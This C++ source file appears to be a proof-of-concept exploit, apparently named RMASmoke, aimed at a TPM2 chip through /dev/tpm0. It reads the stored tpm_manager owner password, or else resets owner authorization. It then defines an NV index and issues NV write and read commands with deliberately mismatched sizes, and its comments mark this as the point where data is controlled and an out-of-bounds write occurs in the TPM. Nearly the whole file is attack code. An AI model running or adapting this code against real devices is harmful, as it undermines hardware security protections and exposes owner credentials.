#include <algorithm>
#define MAXLOGLEVEL 6
#include "esys_context.h"

#include "../gen/src/tpm_manager.pb.h"
#include "tss_context.h"
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <endian.h>
#include <linux/types.h>

#include <getopt.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <string.h>
#include <string>
#include <sys/fcntl.h>
#include <sys/file.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/un.h>
#include <tss2/tss2_common.h>
#include <tss2/tss2_esys.h>
#include <tss2/tss2_sys.h>
#include <tss2/tss2_tpm2_types.h>
#include <unistd.h>
void ConsumeInputBuffer() {
  char buffer[1];

  while (fread(buffer, 1, 0, stdin))
    ;
}
TSS2_SYS_CONTEXT *GenerateContext(size_t *size = nullptr) {
  size_t fakeContextSize = Tss2_Sys_GetContextSize(0);
  TSS2_SYS_CONTEXT *sysctx = (TSS2_SYS_CONTEXT *)calloc(1, fakeContextSize);
  memset(sysctx, 0, fakeContextSize);
  ((TSS2_SYS_CONTEXT_INT *)sysctx)->cmdBuffer =
      (UINT8 *)((uintptr_t)sysctx + sizeof(TSS2_SYS_CONTEXT_INT));
  ((TSS2_SYS_CONTEXT_INT *)sysctx)->maxCmdSize =
      fakeContextSize - sizeof(TSS2_SYS_CONTEXT_INT);
  if (size)
    *size = fakeContextSize;
  return sysctx;
}
struct tpm_result {
  __be16 tag;
  __be32 length;
  __be32 ordinal;
  __be16 subcmd;
} __attribute__((packed));
tpm_result *GetCommandBufferFromSys(TSS2_SYS_CONTEXT *ctx) {
  uintptr_t ptr = (uintptr_t)(ctx);
  ptr +=
      sizeof(uintptr_t); // There is one pointer towards the actual buffer ptr;
  return (tpm_result *)(((TSS2_SYS_CONTEXT_INT *)ctx)->cmdBuffer);
}
void ReadFromInput(std::string *input) {}
void free_result_struct(tpm_result *result) { free(result); }
void ClearTPMContext(TSS2_SYS_CONTEXT *ctx) {
  size_t len = Tss2_Sys_GetContextSize(0) - sizeof(TSS2_SYS_CONTEXT_INT);
  memset((void *)(&((TSS2_SYS_CONTEXT_INT *)ctx)[1]), 0, len);
  (*(((uint8_t *)ctx) + 0x40)) = CMD_STAGE_INITIALIZE;
}
uint32_t SendTPMCommand(tpm_result *buf, size_t len, tpm_result **respBuf,
                        size_t *respLen, int tpmfd) {
  if (len > 2048) {
    printf("We have a problem!\n");
    return -1;
  }
  int written = write(tpmfd, buf, len);
  if (written != len) {
    printf("written != len; %lu != %d\n with linux rc %d\n", len, written,
           errno);
    return -1;
  }
  char *responseBuffer = new char[2048];
  char *response = responseBuffer;
  size_t responseLen = 0;
  memset(responseBuffer, 0, 2048);
  int read_count = 0;
  do {
    size_t rx_to_go = 2048 - responseLen;
    printf(" Read to go!!! %lu\n", rx_to_go);
    response = response + responseLen;
    read_count = read(tpmfd, response, rx_to_go);
    responseLen += read_count;
  } while (read_count);
  response = responseBuffer;
  struct tpm_result *pkt = (struct tpm_result *)responseBuffer;
  uint32_t rv;
  memcpy(&rv, &pkt->ordinal, sizeof(rv));
  rv = be32toh(rv);
  if (respBuf) {
    if (!*respBuf) {
      *respBuf = (tpm_result *)responseBuffer;
    } else {
      memcpy(*respBuf, pkt, responseLen);
    }
  }
  if (respLen)
    *respLen = responseLen;
  printf("Received response: %d...\t with length %lu\n", rv, responseLen);
  return rv;
}
void PreComplete(TSS2_SYS_CONTEXT *sysctx) {
  (*(((uint8_t *)sysctx) + 0x40)) = CMD_STAGE_RECEIVE_RESPONSE;
}
void ReadFileToString(std::string path, std::string *data) {
  int fd = open(path.c_str(), O_RDONLY);
  if (fd < 0) {
    perror("Couldn't open file, will die!!!: \n");
    exit(-1);
  }
  data->clear();
  int count = 0;
  do {
    char tempBuf[1024];
    int count = read(fd, tempBuf, 1024);
    if (!count) {
      return;
    } else if (count > 0) {
      data->append(tempBuf, count);
    } else {
      perror("Couldn't read file, will die!!!: \n");
      exit(-1);
    }
  } while (count == 0);
}
void FailForBadRC(const char *fmt, int rc) {
  if (rc != 0) {
    printf(fmt, rc);
    exit(-1);
    return;
  }
}
bool exists(std::string path) {
  struct stat s;
  return (stat(path.c_str(), &s) == 0);
}
constexpr static const char *kLocalTPMDataPath =
    "/var/lib/tpm_manager/local_tpm_data";
int main(int c, char **argv) {

  if (c <= 1) {
    printf("need more parameters!!\n");
    return -1;
  }
  std::string dat;

  // For RMA Shim
  // TPM Owner is cleared, so HierarchyChangeAUth

  TPM2B_AUTH auth;
  auth.size = 0;
  FILE *passwd_file = fopen(argv[1], "w+");

  const char *passwd = "default password";
  if (c > 2) {
    passwd = argv[2];
  }
  struct sockaddr_un remote;
  int tpmfd = open("/dev/tpm0", O_RDWR);
  if (tpmfd < 0) {
    perror("Failed to connect to TPM2!");
    printf("\n");
    return -1;
  }

  printf("Successfully connected to the TPM2!\n");
  fprintf(passwd_file, "%s\n", passwd);

  
  TPM2B_NV_PUBLIC pub;
  memset(&pub, 0, sizeof(pub));
  TPMA_NV x;
  UINT32 nvidx = (UINT32)(0x80000B);
  pub.nvPublic.attributes = TPMA_NV_OWNERREAD | TPMA_NV_OWNERWRITE |
                            TPMA_NV_AUTHREAD | TPMA_NV_AUTHWRITE;
  pub.nvPublic.dataSize = 2048;
  pub.nvPublic.nameAlg = TPM2_ALG_SHA256;
  pub.nvPublic.authPolicy.size = 0;

  pub.nvPublic.nvIndex = TPM2_NV_INDEX_FIRST + nvidx;
  pub.size = sizeof(TPM2B_NV_PUBLIC);
  size_t size;
  TSS2_SYS_CONTEXT *sysctx = GenerateContext(&size);
  bool owner_password_found = false;
  if (exists(kLocalTPMDataPath)) {
    tpm_manager::LocalData ld;
    std::string dat;
    ReadFileToString(kLocalTPMDataPath, &dat);
    ld.ParseFromString(dat);
    passwd = ld.owner_password().c_str();
    owner_password_found = true;
  }
  struct tpm_result *b = GetCommandBufferFromSys(sysctx);
  tpm_result *resultPtr = nullptr;
  size_t resp_len = 0;
  int rc = 0;
  // Owner password is the default or provided passwd.
  const char *owner_password = strdup(passwd);
  // Owner passwords length is owner password without null temrination,
  // (sha256 hash)
  const size_t owner_password_len = strlen(passwd);
  if (!owner_password_found) {
    TPM2B_AUTH auth0;
    memset(auth0.buffer, 0, 64);
    auth0.size = SHA256_DIGEST_LENGTH;

    // Fill in HierarchyChangeAuth data to change owner auth.
    Tss2_Sys_HierarchyChangeAuth_Prepare(sysctx, TPM2_RH_OWNER, &auth0);

    TPMS_AUTH_COMMAND cmd_auth = {
        .sessionHandle = TPM2_RS_PW,
        .nonce = {.size = 0, .buffer = {}},
        .sessionAttributes = TPMA_SESSION_CONTINUESESSION,

        .hmac = {.size = 0, .buffer = {}},
    };

    cmd_auth.hmac.size = SHA256_DIGEST_LENGTH;
    TSS2L_SYS_AUTH_COMMAND xx = {.count = 1, .auths = {cmd_auth}};
    Tss2_Sys_SetCmdAuths(sysctx, &xx);
    rc = SendTPMCommand(b, be32toh(b->length), &resultPtr, &resp_len, tpmfd);
    PreComplete(sysctx);
    memcpy(b, resultPtr, std::min(2048UL, resp_len));
    printf("Got RC: %d\n", rc);
  }

  TPM2B_PUBLIC twob_public = {};
  TPM2B_NAME name = {};
  TPM2B_NAME qualified_name = {};

  twob_public = {};
  name = {};
  qualified_name = {};

  ClearTPMContext(sysctx);

  rc = Tss2_Sys_NV_DefineSpace_Prepare(sysctx, TPM2_RH_OWNER, &auth, &pub);
  // TPMS Authorization, because of how it requires auth for nvram.
  TPMS_AUTH_COMMAND authcmd2 = {};
  authcmd2.hmac = {
      .size = (UINT16)owner_password_len,
      .buffer = {},
  };
  memcpy(authcmd2.hmac.buffer, owner_password, owner_password_len);
  authcmd2.nonce = {0, {}};
  authcmd2.sessionAttributes = TPMA_SESSION_CONTINUESESSION;
  authcmd2.sessionHandle = TPM2_RS_PW;
  TSS2L_SYS_AUTH_COMMAND cmd = {1, {authcmd2}};

  Tss2_Sys_SetCmdAuths(sysctx, &cmd);
  PreComplete(sysctx);

  rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);
  FailForBadRC("SendTPMCommand Error %d\n", rc);

  ClearTPMContext(sysctx);

  TPM2B_MAX_NV_BUFFER nvbuf;
  memset(nvbuf.buffer, 0, 1);
  nvbuf.size = 1;
  // NVRAM write (This is where we control the data is copied).
  rc = Tss2_Sys_NV_Write_Prepare(sysctx, TPM2_RH_OWNER,
                                 TPM2_NV_INDEX_FIRST + nvidx, &nvbuf, 1024);

  FailForBadRC("Tss2_Sys_NV_Write_Prepare Error %d\n", rc);

  Tss2_Sys_SetCmdAuths(sysctx, &cmd);
  PreComplete(sysctx);

  rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);
  FailForBadRC("SendTPMCommand for NV_Write Error %d\n", rc);

  ClearTPMContext(sysctx);
  // Out of bounds write is here (in the tpm2 of course)
  rc = Tss2_Sys_NV_Read_Prepare(sysctx, TPM2_RH_OWNER,
                                TPM2_NV_INDEX_FIRST + nvidx, 2048, 0);

  Tss2_Sys_SetCmdAuths(sysctx, &cmd);

  PreComplete(sysctx);

  rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);

  ClearTPMContext(sysctx);
  rc = Tss2_Sys_NV_UndefineSpace_Prepare(sysctx, TPM2_RH_OWNER,
                                         TPM2_NV_INDEX_FIRST + nvidx);

  FailForBadRC("Attempting to delete but received %d\n", rc);

  Tss2_Sys_SetCmdAuths(sysctx, &cmd);

  PreComplete(sysctx);
  rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);
  FailForBadRC("Attempting to delete but received %d\n", rc);

  printf("RMASmoke is succesful!");
  close(tpmfd);
  return 0;
}
